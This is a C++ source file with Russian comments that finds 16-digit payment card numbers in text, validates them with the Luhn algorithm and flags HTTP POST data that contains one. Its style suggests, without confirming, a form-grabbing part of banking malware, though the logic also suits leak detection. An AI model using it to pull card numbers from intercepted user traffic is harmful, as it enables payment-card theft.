//---------------------------------------------------------------------

#include "Strings.h"

//ищет подряд идущие 16 цифр, причем между цифрами могут быть любые символы, также перед первой
//цифрой (предыдущая позиция) не должно быть цифры и после последней цифры не должно быть сразу цифры
//Если найдено 16 цифр, то возвращает начальную их позицию, если нет, возвращает szSrc или больше,
//в posEnd будет позиция последней цифры
int FindCard16Digit(char* pSrc, int szSrc, int pos, char* pDst, int& posEnd )
{
	for(;;)
	{
        //ищем начало номера карточки
		while( pos < szSrc )
		{
			if( pSrc[pos] == '4' || pSrc[pos] == '5' || pSrc[pos] == '6' ) //номер карточки всегда начинается с 4 или 5
				break;
			pos++;
		}
		//ищем дальше цифры
		if( pos < szSrc )
		{
			if( (pos > 0 && !CharIsDigit(pSrc[pos - 1])) || pos == 0 ) //если в предыдущей позиции не цифра
			{
				int i = 0;
				pDst[i++] = pSrc[pos]; //сохранили 1-ю цифру
				int pos1 = pos + 1;
				//ищем таким образом чтобы если между цифрами есть разрывы, то чтобы подряд было обязательно 4 цифры
				int together = 1; //количество подряд идущих цифр
				while( pos1 < szSrc && i < 16 ) //ищем следующие цифры
				{
					if( CharIsDigit( pSrc[pos1] ) )
					{
						pDst[i++] = pSrc[pos1]; //сохранили очередную цифру
						posEnd = pos1; //позиция последней цифры
						together++;
					}
					else
					{
						if( together > 0 && together != 4 )  //если подряд не 4 цифры, то
						{
							if( together < 4 ) //если их меньше 4-х, то игнорим найденные цифры, т. е. делам возрат назад
							{
								i -= together;
								if( i == 0 ) //если это были начальные цифры, то прекращаем поиск
									break;
							}
							else
							{
								break; //если больше, то прекращаем поиск
							}
						}
						together = 0;
					}
					pos1++;
				}
				if( i == 16 ) //нашли 16 цифр, если не нашли, то в pos будет = szSrc, что означает - последовательности из 16 цифр нет
				{
					if( pos1 >= szSrc || !CharIsDigit(pSrc[pos1]) ) //если дошли до конца или следующий символ не цифра
					{
						pDst[i] = 0; //нашли нужное, завершающий нуль
						break;
					}
				}
				else
				{
					if( pos1 >= szSrc )//дошли до конца строки значит заканчиваем поиск, все равно ничего уже не найдем
					{
						pos = szSrc;
						break;
					}
				}
			}
			pos++; //переходим на следующую позицию в строке
		}
		else
			break;
	}
	return pos;
}
//----------------------------------------------------------------------------

//алгоритм Луна, складывает цифры определенным образом, результирующая сумма должна оканчиваться нулем (кратна 10)
//возвращает true, если алгоритм сработал
bool IsCreditCardLuna(char* digits)
{
	int sum = 0;
	int i = 0;
	while( *digits != 0 )
	{
		//из символа в число
		int v = *digits - '0';

		//через одну цифру
		if( (i & 1) == 0 )
		{
			v *= 2; //удваиваем
			if( v > 9 ) v -= 9; //если больше 9, то вычитаем 9
		}
		sum += v;
		digits++;
		i++;
	}
	return (sum % 10) == 0; //если кратна 10, то это номер карты
}
//----------------------------------------------------------------------------

//ищет в строке pSrc длиною szSrc, начиная с позиции fromSrc номер карты, номер ложится в pDst,
//pDst массив не менее из 17 байт
//если номер карты найден, то возвращается ее позиция в строке, иначе -1
//в posEnd будет позиция последней цифры
int FindCreditCard( char* pSrc, int szSrc, int fromSrc, char* pDst, int& posEnd )
{
	int pos = fromSrc;
	for(;;)
	{
    	//ищем последовательность из 16 цифр
		pos = FindCard16Digit( pSrc, szSrc, pos, pDst, posEnd );

		//если нашли 16 цифр то проверяем их алогоритмом Луна
		if( pos < szSrc )
		{
			//проверяем алгоритмом Луна
			if( IsCreditCardLuna(pDst) )
			{
            	//если подходит, то возвращаем позицию начала номера карты
				return pos;
            }

			//не прошло проверку, продолжаем поиск со следующей строки
			pos++;
		}
		else
			break;
	}
	//ничего не нашли
	pDst[0] = 0;
	return -1;
}

//----------------------------------------------------------------------------

//  Функция возвращает истину если пост данные содержат номер
//  кредитной карты
bool ContainCreditCardNomber(PCHAR PostData)
{
	char Nomber[17];
	int EndPos = 0;
    int Pos = -1;

	if (!STR::IsEmpty(PostData))
		Pos = FindCreditCard(PostData, StrCalcLength(PostData), 0, Nomber, EndPos);

	return Pos >= 0;
}
